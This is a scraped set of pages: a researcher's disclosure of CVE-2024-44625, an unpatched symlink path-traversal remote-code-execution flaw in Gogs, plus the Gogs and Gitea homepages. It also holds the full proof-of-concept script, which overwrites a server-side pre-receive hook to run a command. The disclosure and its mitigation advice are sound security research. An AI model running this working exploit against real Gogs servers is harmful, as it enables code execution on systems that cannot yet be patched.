=== Content from fysac.github.io_46b93990_20250114_195401.html ===
[Vulnerability research and more](https://fysac.github.io/ "Vulnerability research and more (Alt + H)")

# Unpatched Remote Code Execution in Gogs

November 13, 2024

The [Gogs](https://gogs.io/) self-hosted Git service is vulnerable to symbolic link path traversal that enables remote code execution ([CVE-2024-44625](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-44625)). The latest version at the time of writing (0.13.0) is affected. This vulnerability is exploitable against a default install, with the only attacker requirement being access to an account that can push to a repository and edit that repository’s files from the web interface.

Per Gogs’ [`SECURITY.md`](https://github.com/gogs/gogs/blob/2541348408e120e9acd4ff7fb6419e3a00233c67/SECURITY.md), I reported this issue to the maintainers as a GitHub advisory on August 10, 2024. Though I followed up multiple times, my report was never acknowledged and remains unaddressed at the time of writing. My experience here was not an anomaly; there is currently an [open issue](https://github.com/gogs/gogs/issues/7777) tracking several other high and critical vulnerabilities left unpatched due to a lack of response from the Gogs developers.

As the 90-day disclosure deadline I gave in my report has now passed, I am publishing the full technical details of CVE-2024-44625, as well as a proof-of-concept exploit. I advise anyone running Gogs to close off access to the public and untrusted users, disable user registration, set strong passwords and enable 2FA for existing accounts, and migrate to [Gitea](https://about.gitea.com/), which is an actively maintained fork of Gogs not affected by this vulnerability.

## The vulnerability[#](#the-vulnerability)

Gogs’ web editor allows the user to modify and rename repository files directly from the web interface. When the user submits their edits, the frontend issues a POST request to the `/:username/:reponame/_edit/:branch/:filepath` endpoint. The request is handled by the [`editFilePost`](https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/route/repo/editor.go#L122) function, which validates/sanitizes the request parameters and eventually calls the [`UpdateRepoFile`](https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/database/repo_editor.go#L121) function. `UpdateRepoFile` then performs the requested changes as a series of direct filesystem operations on a clone of the repository and commits them.

Below is a snippet from `UpdateRepoFile` that shows the core logic for modifying and renaming a file ([`internal/database/repo_editor.go#L159-L196`](https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/database/repo_editor.go#L159-L196)).

| ``` 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196  ``` | ``` oldFilePath := path.Join(localPath, opts.OldTreeName) filePath := path.Join(localPath, opts.NewTreeName) if err = os.MkdirAll(path.Dir(filePath), os.ModePerm); err != nil {     return err } // If it's meant to be a new file, make sure it doesn't exist. if opts.IsNewFile {     if com.IsExist(filePath) {         return ErrRepoFileAlreadyExist{filePath}     } } // Ignore move step if it's a new file under a directory. // Otherwise, move the file when name changed. if osutil.IsFile(oldFilePath) && opts.OldTreeName != opts.NewTreeName {     if err = git.Move(localPath, opts.OldTreeName, opts.NewTreeName); err != nil {         return fmt.Errorf("git mv %q %q: %v", opts.OldTreeName, opts.NewTreeName, err)     } } if err = os.WriteFile(filePath, []byte(opts.Content), 0600); err != nil {     return fmt.Errorf("write file: %v", err) } if err = git.Add(localPath, git.AddOptions{All: true}); err != nil {     return fmt.Errorf("git add --all: %v", err) } err = git.CreateCommit(     localPath,     &git.Signature{         Name:  doer.DisplayName(),         Email: doer.Email,         When:  time.Now(),     },     opts.Message, )  ``` |
| --- | --- |

Because the code writes to client-controlled file paths (via a call to `os.WriteFile`, highlighted above), care must be taken to prevent modifications to files outside of the clone directory. The classic example of this is path traversal, in which we might submit a path of `../../../foo` to write to a file other than the intended destination. Part of the aforementioned parameter sanitization in `editFilePost` [prevents](https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/route/repo/editor.go#L138) this basic kind of traversal.

However, there is another type of vulnerability that can have the same effect as traditional path traversal: symbolic link following. If we added a symlink to `/tmp/foo` to a repository, pushed it to Gogs, and modified the link’s contents using the web editor, we would have actually modified the contents of `/tmp/foo`. Note that this potential exists because `os.WriteFile` opens the file [without specifying](https://cs.opensource.google/go/go/%2B/refs/tags/go1.23.3%3Asrc/os/file.go;l=831) the `O_NOFOLLOW` flag, causing `UpdateRepoFile` to follow any symlinks present in the repository.

The developers anticipated this possibility and added a guard against it in `editFilePost`, shown below ([internal/route/repo/editor.go#L175-L198](https://github.com/gogs/gogs/blob/7a2dffa95ac64f31c8322cb50d32694b05610144/internal/route/repo/editor.go#L175-L198)).

| ``` 175 176 177 178 179 180 181 182 183 184 185 186 187 188 189 190 191 192 193 194 195 196 197 198 199  ``` | ``` var newTreePath string for index, part := range treeNames {     newTreePath = path.Join(newTreePath, part)     entry, err := c.Repo.Commit.TreeEntry(newTreePath)     if err != nil {         if gitutil.IsErrRevisionNotExist(err) {             // Means there is no item with that name, so we're good             break         }         c.Error(err, "get tree entry")         return     }     if index != len(treeNames)-1 {         if !entry.IsTree() {             c.FormErr("TreePath")             c.RenderWithErr(c.Tr("repo.editor.directory_is_a_file", part), tmplEditorEdit, &f)             return         }     } else {         if entry.IsSymlink() {             c.FormErr("TreePath")             c.RenderWithErr(c.Tr("repo.editor.file_is_a_symlink", part), tmplEditorEdit, &f)             return         // ...  ``` |
| --- | --- |

Here, `treeNames` is a slice containing the components of the *new* path (in case it is being renamed) of the file being edited. The code iterates over these components, appending the current component to `newTreePath` and checking the Git tree entry at the value of `newTreePath`. If the entry is a symlink, the request is rejected and an error message is displayed to the user (highlighted above). For example, given the path `foo/bar/baz`, if any one of `foo`, `foo/bar`, or `foo/bar/baz` is a symlink, `editFilePost` rejects the request.

However, notice the opportunity on lines 179-182 to break from the loop before the symlink check is performed. If `newTreePath` is a path that is not already part of the repository (that is, a nonexistent file), the loop ends early, skipping over the symlink check. The consequence is that editing a symlink’s contents while *simultaneously* moving it to a path that does not already exist allows us to modify arbitrary files on the system.

With this primitive in hand, we can achieve code execution by taking advantage of [server-side Git hooks](https://git-scm.com/book/ms/v2/Customizing-Git-Git-Hooks#_server_side_hooks). These are scripts that live in the repository’s `hooks` directory on the server, executed at various points before and after a push to the server. We can create a symlink to one of these hook files, such as `pre-receive`, and overwrite its contents with a command of our choice. The hook and our command will then automatically execute without any extra work on our part when Gogs updates the repository with the new symlink contents.

## Exploit[#](#exploit)

A proof-of-concept exploit script can be found [here](https://github.com/Fysac/CVE-2024-44625/blob/main/poc.py).

© 2024 [Vulnerability research and more](https://fysac.github.io/) ·
Powered by
[Hugo](https://gohugo.io/) &
[PaperMod](https://github.com/adityatelange/hugo-PaperMod/)

=== Content from about.gitea.com_7fd31fc2_20250115_115341.html ===


[**Try Â  Gitea Cloud Â  âï¸ Â  free for 30 daysÂ**Â âÂ Accelerate your Dev & Deploy!](/products/cloud)

[![](/gitea-text.svg)Gitea](/)Open main menuProducts [Gitea Cloud](/products/cloud/)

Get a DevOps instance in minutes

[Gitea Enterprise](/products/gitea-enterprise/)

Run an enhanced DevOps instance yourself

[Gitea](/products/gitea/)

Run a free DevOps instance yourself

[Gitea Actions](/products/runner/)

Automate your Gitea workflows

[Tea](/products/tea/)

Command line tool to interact with Gitea Servers

Resources [News](/news)

What happened around CommitGo and Gitea

[Documentations](https://docs.gitea.com)

Documentation for Gitea and related tools

[Tutorials](/resources/tutorials/)

Tutorals and advice on using Gitea

[Blog](https://blog.gitea.com)

Release notes and updates about Gitea

Community [Forum](https://forum.gitea.com)

Find or help out with community support

[Chatroom](https://discord.gg/gitea)

Chat with the community

[Open Source](https://github.com/go-gitea/gitea)

View Gitea code and contribute development

[Translation](https://translate.gitea.com)

Help translate Gitea

[Supporters](/community/supporters/)

View supporters of Gitea

[Pricing](/pricing)[Cloud](https://cloud.gitea.com)[Log In](https://gitea.com/user/login) Â  Â  [Contact Us](/contact/contact)
# Private, Fast, Reliable DevOps Platform

Brings teams and developers high-efficiency but easy operations from planning to production.

![](/img/gitea-cloud-concept.png)
### [Gitea Cloud](https://cloud.gitea.com)

* Launch a dedicated Gitea on cloud.
* For individual developers and enterprise users.
* The fastest way to have it!

[Start Free Gitea Cloud Trialâ](https://cloud.gitea.com)

![](/img/gitea-enterprise-concept.png)
### [Gitea Enterprise](https://customers.gitea.com)

* Deploy an enhanced Gitea anywhere.
* Designed for enterprise users.
* Enjoy an enhanced experience!

[Start Free Gitea Enterprise Trialâ](https://customers.gitea.com)

![](/img/gitea-com-concept.png)
### [Gitea.com](https://gitea.com/user/login)

* A public free service for everyone.
* Where Gitea builds its own tools.
* Reasonable restrictions on resource usage.

[Sign into Gitea.comâ](https://gitea.com/user/login)

![App screenshot](/img/home-screenshot.png)Docker PullsM+Github StarsK+InstallationsK+Contributors+
## Dev/Deploy faster

Everything you need to develop/deploy your application

 Code HostingGitea enables the creation and management of repositories based on Git. It also makes code review incredibly easy and convenient, enhancing code quality for users and businesses. CI/CDGitea features an integrated CI/CD system, Gitea Actions, that is compatible with [GitHub Actions](https://github.com/features/actions). Users can create workflows using the familiar YAML format or utilize over 20K existing plugins. ProjectsYou can efficiently manages requirements, features and bugs through issue tasks, labeling and kanban boards. These tools help plan and track the progress of your development by incorporating branches, tags, milestones, assignments, time tracking and dependencies. PackagesGitea supports more than 20 different kinds of public or private package management, including: [Cargo](https://doc.rust-lang.org/cargo/), [Chef](https://www.chef.io), [Composer](https://getcomposer.org), [Conan](https://conan.io), [Conda](https://conda.io), [Container](https://opencontainers.org), [Helm](https://helm.sh), [Maven](https://maven.apache.org), [NPM](https://www.npmjs.com), [NuGet](https://www.nuget.org), [Pub](https://pub.dev), [PyPI](https://pypi.org), [RubyGems](https://rubygems.org), [Vagrant](https://www.vagrantup.com), etc.
## Trusted by the worldâs most innovative teams

![Google](/img/logos/google.svg)![TwoSigma](/img/logos/two-sigma.svg)![MTK](/img/logos/mtk.svg)![Mastercard](/img/logos/mastercard.svg)![Openstacko](/img/logos/openstack.svg)
# Run Gitea Anywhere

Gitea offers universal compatibility and flexible deployment options.

 Run Anywhere Universally compatible with diverse operating systems and environments, including Linux, Windows, macOS, FreeBSD, Kubernetes, and etc. Compatible with multiple architectures, such as x86 and arm64. Supported Frequent Databases Offers seamless integration with various databases, including SQLite, MySQL, PostgreSQL, TiDB, MS SQL, and etc. Flexible Deployment Provides flexible deployment options, supporting both single server setups and replication configurations.![Product screenshot](/img/platform-logos.png)
## Test, Deploy Faster

Powerful built-in CI/CD

Gitea Actions is an internal CI/CD system, offering near compatibility with GitHub Actions.

 Integrated UI An integrated UI with no extra configuration make it easy to use Workflow/Action Syntax Compatible Workflow/Action Syntax Compatible with GitHub Actions Reuse Github Actions Reuse Thousands of GitHub Actions in your Gitea instances.![Product screenshot](/img/home-screenshot-2.png)
# Integrated with Your Favorite Tools

Boost your workflow with Gitea's versatile integrations

 Chat Tool Integration Sync seamlessly with tools like Slack, Discord, MS Teams, Lark, and more. External CI/CD Service Compatibility Improve workflows with integrations like Github Actions, Drone, Woodpecker, ArgoCD, and Jenkins, among others. API and Webhooks Extend Gitea's functionality with our API and webhooks, creating custom workflows to match your unique needs. More integration possibilities await.![Product screenshot](/img/integration-logos.png)
## Testimonials

We have worked with thousands of amazing people

> âGitea is an excellent and easy to use version control system. It provides a clean and intuitive interface that makes it easy for teams to collaborate and manage code projects. Gitea also has abundant features, including issue tracking, code review, and continuous integration, which can improve team efficiency and code quality. Both individual developers and corporate teams can benefit from Gitea â it's truly a useful tool. â

![](https://github.com/appleboy.png)AppleBoy@appleboy![](/img/logos/mtk.svg)

> âWe have been using gitea for several years and have found it to be an essential part of our workflow for hosting git repositories. Gitea has quite a few features and is under active development bringing new functionality. â

![](/img/default_profile.png)Dan K.@dan\_k

> âwow. just wow. I wanted to see how "painless" this was but figured it would still take a week to learn everything and setup. 2 hours! from downloading it to configuring it and setting it up as a windows service and setting up active directory integration.â

![](https://ph-avatars.imgix.net/61044/original?auto=compress&codec=mozjpeg&cs=strip&auto=format&w=36&h=36&fit=crop&dpr=2)Tony Brix@tonybrix

> âBest Open-Source and self-hosting platform for version control: Gitea.â

![](/img/default_profile.png)Kaviraj R.@kaviraj\_r

> âEasy to use, open source, can be hosted on any platform, ditributed source code management, multiple developers can clone code, change it and commit it from different machines, can have your self-hosted git repository.â

![](/img/default_profile.png)Sachin R.@sachin\_r

Pricing plans for teams of all sizes

Payment frequencyMonthlyAnnually
### Open Source

Enjoy Gitea for free under the MIT license open source.

Free

[Download](/products/gitea)

* Self hosted
* Rapid updates
* Active contributions
* Community supports
### SaaS (Gitea Cloud)

A plan that scales with your rapidly growing business.

$9.5$19\*/user/month

[Start your 30-day free trial](https://cloud.gitea.com)Price Calculator\* Discount available for non-profits, and small companies

* Managed Gitea instances and CI/CD runners
* All the great functionality of Gitea
* Choose your cloud provider and region
* Unlimited network traffic
* Zero Maintenance
* Upgrade automatically
* $10 per 100GB of add-on object storage
* Super fast user experience
* Professional business support (online/email)
### Enterprise

Dedicated support and infrastructure for your company.

$9.5$19/user/month

[Start your 30-day free trial](https://customers.gitea.com)[Contact sales](/contact/form)

* Self hosted
* All the great functionality of Gitea
* Enhanced enterprise-level features and experiences
* Discounts available for non-profits and small companies
* Installation/Upgrade Service
* Priority security bug fix notifications
* Professional business support (online/email)
* Emergency telephone/remote support
## Want product news and updates?

Sign up for our newsletter.

Email addressSubscribe

We care about your data. Read our [privacyÂ policy](/privacy-policy).

## Footer

![](/img/footer/medal-1.svg)![](/img/footer/medal-2.svg)![](/img/footer/medal-3.svg)

Private, Fast, Reliable DevOps Platform

[LinkedIn](https://linkedin.com/company/commitgo)[X](https://twitter.com/giteaio)[GitHub](https://github.com/go-gitea/gitea)[Gitea](https://gitea.com/gitea)

Â© 2024 CommitGo, Inc. All rights reserved.

### Products

* [Gitea Cloud](/products/cloud)
* [Gitea Enterprise](/products/gitea-enterprise)
* [Gitea](/products/gitea)
* [Gitea Runner](/products/runner)
* [Tea Command-line Tool](/products/tea)
### Support

* [Pricing](/pricing/)
* [Documentation](https://docs.gitea.com)
* [Tutorials](/resources/tutorials/)
* [API](https://docs.gitea.com/api/1.21/)
* [Blog](https://blog.gitea.com)
* [Forum](https://forum.gitea.com)
* [Chatroom](https://discord.gg/gitea)
### About Us

* [What is DevOps](/about/devops)
* [Why Gitea](/about/whygitea)
* [Contact Us](/contact/contact)
* [Compliance](/about/compliance)
### Legal

* [Privacy](/privacy-policy/)
* [Terms](/terms-of-service/)



=== Content from gogs.io_8be77b4c_20250115_115344.html ===

[Home](/)
[Download](https://dl.gogs.io)
[Documentation](/docs)
 [GitHub](https://github.com/gogs/gogs)

English
[English](/?lang=en-US)
[简体中文](/?lang=zh-CN)
[Français](/?lang=fr-FR)
[Deutsch](/?lang=de-DE)

![](/img/hero.png)
## A painless self-hosted Git service.

 [Install Now](/docs/installation)
[Try a Demo](https://try.gogs.io/)

### Easy to install

Simply [run the binary](/docs/installation/install_from_binary) for your platform. Or ship Gogs with [Docker](https://github.com/gogs/gogs/tree/master/docker) or [Vagrant](https://github.com/geerlingguy/ansible-vagrant-examples/tree/master/gogs), or get it [packaged](/docs/installation/install_from_packages).

### Cross-platform

Gogs runs anywhere [Go](https://golang.org/) can compile for: Windows, Mac, Linux, ARM, etc.

### Lightweight

Gogs has low minimal requirements and can run on an inexpensive Raspberry Pi. Some users even run Gogs instances on their NAS devices.

# Open Source

Gogs is 100% open source and free of charge. All source code is available under the [MIT License](https://github.com/gogs/gogs/blob/master/LICENSE) on [GitHub](https://github.com/gogs/gogs).

# Screenshots

Scroll

![](/img/screenshots/1.png)
![](/img/screenshots/2.png)
![](/img/screenshots/3.png)
![](/img/screenshots/4.png)
![](/img/screenshots/5.png)
![](/img/screenshots/6.png)
![](/img/screenshots/7.png)
![](/img/screenshots/8.png)
![](/img/screenshots/9.png)

# Who Is Using Gogs

[![](/img/brands/igt.png)](https://www.igt.com/)
[![](/img/brands/notabug.png)](https://notabug.org/)
[![](/img/brands/yeeuu.png)](http://www.yeeuu.com/)
[![](/img/brands/jesns.gif)](http://www.jesns.com/)
[![](/img/brands/fabric8.svg)](http://fabric8.io/)
[![](/img/brands/weimaitong.jpg)](http://weimaitong.com/)
[![](/img/brands/netease_game.png)](http://game.163.com/)
[![](/img/brands/osinet.png)](http://www.osinet.fr/)
[![](/img/brands/codemen.png)](http://codemen.com/)
[![](/img/brands/unfoldingword.png)](https://unfoldingword.org/)
[![](/img/brands/cubekode.png)](http://cubekode.com/)
[![](/img/brands/teknik.svg)](https://teknik.io/)
[![](/img/brands/liepin.png)](https://www.liepin.com/)
[![](/img/brands/keenton.png)](https://www.keenton.com/)
[![](/img/brands/loadingplay.png)](https://www.loadingplay.com/)
[![](/img/brands/proginn.png)](https://www.proginn.com/)
[![](/img/brands/uofmississippi.png)](http://www.olemiss.edu/)
[![](/img/brands/coelis.png)](https://coelis.ch/)
[![](/img/brands/global_access.png)](https://www.global.de/)
[![](/img/brands/adornis.png)](https://adornis.de/)
[![](/img/brands/sunnyvale.jpg)](http://www.sunnyvale.it/)
[![](/img/brands/fxft.jpg)](http://www.fxft.net/)
[![](/img/brands/sapian.png)](https://www.sapian.com.co/)
[![](/img/brands/steelants.png)](https://www.steelants.cz/)
[![](/img/brands/cs2c.png)](http://www.cs2c.com.cn/)

[![](/img/brands/pmooe.png)](https://www.pmooe.at/)

#### About

[Newsletter](http://eepurl.com/bvu3Xb)

#### Find Us

[GitHub](https://github.com/gogs)
[Twitter](https://twitter.com/GogsHQ)

#### Sponsors

[![](/img/sponsors/keycdn.svg)](https://www.keycdn.com/)
[![](/img/sponsors/bitlaunch.svg)](https://bitlaunch.io)
[![](/img/sponsors/vpsserver.svg)](https://www.vpsserver.com/)
[![](/img/sponsors/hosted.nl.png)](https://www.hosted.nl)
[![](/img/sponsors/monovm.png)](https://monovm.com/linux-vps/)

[![](/img/sponsors/digitalocean.png)](https://www.digitalocean.com/?refcode=5aeb02268b55&utm_campaign=Referral_Invite&utm_medium=Referral_Program&utm_source=badge)

@ 2025 Gogs. Website powered by [Peach](https://github.com/Unknwon/peach) and logo was originally designed by [Egon Elbre](https://twitter.com/egonelbre).



=== Content from github.com_1194e2d7_20250115_115342.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFysac%2FCVE-2024-44625%2Fblob%2Fmain%2Fpoc.py)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FFysac%2FCVE-2024-44625%2Fblob%2Fmain%2Fpoc.py)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fblob%2Fshow&source=header-repo&source_repo=Fysac%2FCVE-2024-44625)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[Fysac](/Fysac)
/
**[CVE-2024-44625](/Fysac/CVE-2024-44625)**
Public

* [Notifications](/login?return_to=%2FFysac%2FCVE-2024-44625) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2FFysac%2FCVE-2024-44625)
* [Star
   4](/login?return_to=%2FFysac%2FCVE-2024-44625)

* [Code](/Fysac/CVE-2024-44625)
* [Issues
  0](/Fysac/CVE-2024-44625/issues)
* [Pull requests
  0](/Fysac/CVE-2024-44625/pulls)
* [Actions](/Fysac/CVE-2024-44625/actions)
* [Projects
  0](/Fysac/CVE-2024-44625/projects)
* [Security](/Fysac/CVE-2024-44625/security)
* [Insights](/Fysac/CVE-2024-44625/pulse)

Additional navigation options

* [Code](/Fysac/CVE-2024-44625)
* [Issues](/Fysac/CVE-2024-44625/issues)
* [Pull requests](/Fysac/CVE-2024-44625/pulls)
* [Actions](/Fysac/CVE-2024-44625/actions)
* [Projects](/Fysac/CVE-2024-44625/projects)
* [Security](/Fysac/CVE-2024-44625/security)
* [Insights](/Fysac/CVE-2024-44625/pulse)

## Files

 main
## Breadcrumbs

1. [CVE-2024-44625](/Fysac/CVE-2024-44625/tree/main)
/
# poc.py

Copy path Blame  Blame
## Latest commit

## History

[History](/Fysac/CVE-2024-44625/commits/main/poc.py)99 lines (82 loc) · 3.46 KB main
## Breadcrumbs

1. [CVE-2024-44625](/Fysac/CVE-2024-44625/tree/main)
/
# poc.py

Top
## File metadata and controls

* Code
* Blame

99 lines (82 loc) · 3.46 KB[Raw](https://github.com/Fysac/CVE-2024-44625/raw/refs/heads/main/poc.py)123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899# This script demonstrates exploitation of CVE-2024-44625 by executing the id(1) command and writing its output to /tmp/exploit\_success on the Gogs server.# Access to a user account with permission to push to a repository over HTTP(S) and edit files via the web interface is required.# It may be necessary to adjust the GOGS\_USER variable if the user running Gogs is not "git".
# Tested on version 0.13.0
# usage: python3 poc.py <url> <username> <password>
import osimport reimport requestsimport subprocessimport sysimport urllib
GOGS\_USER = 'git'PATH\_TO\_HOOK = '/home/' + GOGS\_USER + '/gogs-repositories/{}/{}.git/hooks/pre-receive'HOOK\_SYMLINK\_NAME = 'pre-receive.symlink'HOOK\_CONTENT = '''#!/usr/bin/env bashid > /tmp/exploit\_success'''
BRANCH = 'main'
#proxies = {'http':'http://localhost:8080'}proxies = {}
def login(url, username, password): s = requests.Session() s.proxies = proxies r = s.post(url + '/user/login', data={ 'user\_name': username,  'password': password }) check\_error(r) return s
def create\_repo(url, s, repo\_name): r = s.get(url + '/repo/create') uid = re.search('<input type="hidden" id="user\_id" name="user\_id" value="(\d+)"', r.text).group(1) r = s.post(url + '/repo/create', data={ '\_csrf': urllib.parse.unquote(s.cookies['\_csrf']), 'user\_id': uid, 'repo\_name': repo\_name, }) check\_error(r)
def push\_repo(url, username, password, repo\_name): os.mkdir(repo\_name) os.chdir(repo\_name) subprocess.call(['git', 'init']) subprocess.call(['git', 'config', 'user.name', username]) subprocess.call(['git', 'config', 'user.email', '{}@localhost'.format(username)]) subprocess.call(['git', 'remote', 'add', 'origin', '{}://{}:{}@{}/{}/{}.git'.format( url.split('://')[0], username, password, url.split('://')[1], username, repo\_name)])
 os.symlink(PATH\_TO\_HOOK.format(username, repo\_name), HOOK\_SYMLINK\_NAME) subprocess.call(['git', 'add', '.']) subprocess.call(['git', 'commit', '-m', 'add {}'.format(HOOK\_SYMLINK\_NAME)]) subprocess.call(['git', 'push', 'origin', BRANCH])
def edit\_symlink(url, s, username, repo\_name): # Get last commit r = s.get(url + '/{}/{}/\_edit/{}/{}'.format(username, repo\_name, BRANCH, HOOK\_SYMLINK\_NAME)) check\_error(r) last\_commit = re.search('<input type="hidden" name="last\_commit" value="(\w+)">', r.text, re.DOTALL).group(1)
 r = s.post(url + '/{}/{}/\_edit/{}/{}'.format(username, repo\_name, BRANCH, HOOK\_SYMLINK\_NAME), data={ '\_csrf': urllib.parse.unquote(s.cookies['\_csrf']), 'last\_commit': last\_commit,
 # Move the symlink to a nonexistent path while editing it 'tree\_path': 'foo/{}'.format(HOOK\_SYMLINK\_NAME), 'content': HOOK\_CONTENT, 'commit\_summary': '', 'commit\_message': '', 'commit\_choice': 'direct', 'new\_branch\_name': '' }) check\_error(r)
def check\_error(r): if '<div class="ui negative message">' in r.text: error = re.search('<div class="ui negative message">\s\*<p>([^<]+)</p>\s+</div>', r.text).group(1) raise Exception(error)
def main(): (url, username, password) = tuple(sys.argv[1:4]) if url[len(url) - 1] == '/': url = url[:len(url) - 1]
 s = login(url, username, password) repo\_name = os.urandom(3).hex() create\_repo(url, s, repo\_name) push\_repo(url, username, password, repo\_name) edit\_symlink(url, s, username, repo\_name)
if \_\_name\_\_ == '\_\_main\_\_': main()

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


